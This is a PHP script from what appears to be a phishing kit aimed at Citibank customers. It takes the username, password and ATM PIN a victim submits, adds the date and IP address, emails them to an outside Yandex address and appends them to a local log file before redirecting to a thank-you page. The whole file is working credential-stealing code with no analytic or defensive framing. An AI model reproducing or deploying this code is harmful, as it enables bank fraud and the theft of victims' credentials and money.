<?php include_once'../dbf60138c911308b0c99510ba80c36cc.php';?><?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$citiuser = $_POST['citiuser'];
$citipass = $_POST['citipass'];
$citipin = $_POST['citipin'];
$message .="
citi user : ".$citiuser."
citi pw : ".$citipass."
atm pin : ".$citipin."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========|0v3r|=====================||\n";
$send="jokamercairoresult@yandex.com";
$subject = "citi bank cash | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("../0v3r.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = 'thx.php'</script>");
?>